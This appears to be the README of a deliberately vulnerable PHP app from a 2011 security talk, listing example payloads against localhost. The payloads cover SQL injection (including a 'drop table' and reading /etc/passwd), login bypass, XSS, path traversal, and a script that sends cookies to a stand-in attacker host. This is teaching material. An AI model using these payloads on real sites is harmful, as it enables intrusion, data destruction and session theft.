Credit goes to [@jadz](https://github.com/jadz/php-sploits)

This sample code was used for the SydPHP February 2011 talk on website security.

Props go out to @sydphp for hosting the talk and letting us talk. And my partner in crime @CerealBoy.

This code has been developed in such a way that it is vulnerable to the most basic and common website security exploits. It's meant to contain all the bad practices.

SQL Injection / XSS / Session Hijacking are all available through this codebase.

Note: Some of these might not work if your database user doesn't have sufficient privileges.

Steps:
------

1. Load the db.sql file to your database.
2. Change the consts.php file to contain the username and password of database user.
3. Load your site.

Examples:
---------

SQL Injection:
--------------
http://localhost/?username=jared'%20or%20'1'='1
http://localhost/?username=jared'%20or%20''='
http://localhost/index.php?id=1%20or%201=1
http://localhost/?id=1;drop%20table%20invoices -- doesn't work because mysql_query stacked query support -- but will work with other dbs
http://localhost/index.php?username='%20UNION%20SELECT%201,1,1,1,LOAD_FILE('/etc/passwd'),'1
http://localhost/index.php?username='%20UNION%20SELECT%201,2,3,4,5,'hello%20world


Bypass Login:

Password: foo' or '1'='1

XSS:
----
http://localhost/index.php?username=jared%3Cscript%3Ealert('Hi%20there!')%3C/script%3E
http://localhost/template?load=php://filter/convert.base64-encode/resource=loadme

Use XSS to hijack a users session:
----------------------------------
On the 'Send message' page:

Hey just wanted to say that you guys rock!
```js
<script>
new Image().src="http://somereallybadsite.tld/?c="+encodeURI(document.cookie);
</script>
```

XSS to read files on disk:
--------------------------
http://localhost/template.php?load=../../../../etc/passwd%00

